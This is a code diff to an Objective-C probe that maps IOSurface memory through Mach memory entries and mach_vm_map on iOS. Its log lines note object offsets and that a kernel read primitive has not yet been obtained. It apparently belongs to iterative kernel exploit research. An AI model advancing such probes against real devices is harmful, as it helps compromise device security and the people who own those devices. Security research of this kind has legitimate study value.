@@ -17,17 +17,24 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P069_BUILD @"p069-dma-command-map-v1"
+#define P069_BUILD @"p069-dma-command-map-v2"
 
 typedef struct __IOSurface *IOSurfaceRef;
 typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
 typedef mach_port_t (*IOSurfaceCreateMachPort_t)(IOSurfaceRef);
+typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                           mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                           mem_entry_name_port_t object, memory_object_offset_t offset,
                           boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                           vm_inherit_t inheritance);
 kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
+kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
+                                        memory_object_size_t *size,
+                                        memory_object_offset_t offset,
+                                        vm_prot_t permission,
+                                        mem_entry_name_port_t *object_handle,
+                                        mem_entry_name_port_t parent_handle);
 
 @implementation P069DmaCommandMap
 
@@ -78,15 +85,32 @@ kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mac
 
     mach_port_t port = mkport ? mkport(surf) : MACH_PORT_NULL;
     L([NSString stringWithFormat:@"mach port=0x%x", (unsigned)port]);
-    if (port) {
-        mach_vm_address_t addr = 0;
-        kern_return_t kr = mach_vm_map(mach_task_self(), &addr, 64 * 64 * 4, 0, 1,
-                                       port, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
-                                       VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-        L([NSString stringWithFormat:@"mach_vm_map kr=0x%x addr=0x%llx (makeMapping consumer)",
-           (unsigned)kr, (unsigned long long)addr]);
-        if (kr == 0 && addr) mach_vm_deallocate(mach_task_self(), addr, 64 * 64 * 4);
-        mach_port_deallocate(mach_task_self(), port);
+    /* v2 (2026-10-19): the UC port from CreateMachPort is not a memory
+       object — mach_vm_map on it returned kr=0x1d=KERN_INVALID_OBJECT
+       (P069 v1). The working port source is a memory entry over the
+       surface base (p019v2 + p084 proved kr=0x0 on this device). */
+    if (surf && (port || mkport == NULL)) {
+        void *base = dlsym(h, "IOSurfaceGetBaseAddress") ?
+            ((IOSurfaceGetBaseAddress_t)dlsym(h, "IOSurfaceGetBaseAddress"))(surf) : NULL;
+        if (base) {
+            memory_object_size_t esz = 64 * 64 * 4;
+            mem_entry_name_port_t entry = 0;
+            kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
+                (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
+            L([NSString stringWithFormat:@"memory entry kr=0x%x size=0x%llx port=0x%x",
+               (unsigned)ekr, (unsigned long long)esz, (unsigned)entry]);
+            if (ekr == 0 && entry) {
+                mach_vm_address_t addr = 0;
+                kern_return_t kr = mach_vm_map(mach_task_self(), &addr, 64 * 64 * 4, 0, 1,
+                                               entry, 0, false, VM_PROT_READ | VM_PROT_WRITE,
+                                               VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+                L([NSString stringWithFormat:@"mach_vm_map kr=0x%x addr=0x%llx (makeMapping consumer)",
+                   (unsigned)kr, (unsigned long long)addr]);
+                if (kr == 0 && addr) mach_vm_deallocate(mach_task_self(), addr, 64 * 64 * 4);
+                mach_port_deallocate(mach_task_self(), entry);
+            }
+        }
+        if (port) mach_port_deallocate(mach_task_self(), port);
     }
     CFRelease(surf);
     L(@"=== VERDICT === mapping path exercised once. Increment is IOMD+0x68 (not +0x34). hasKread=NO.");
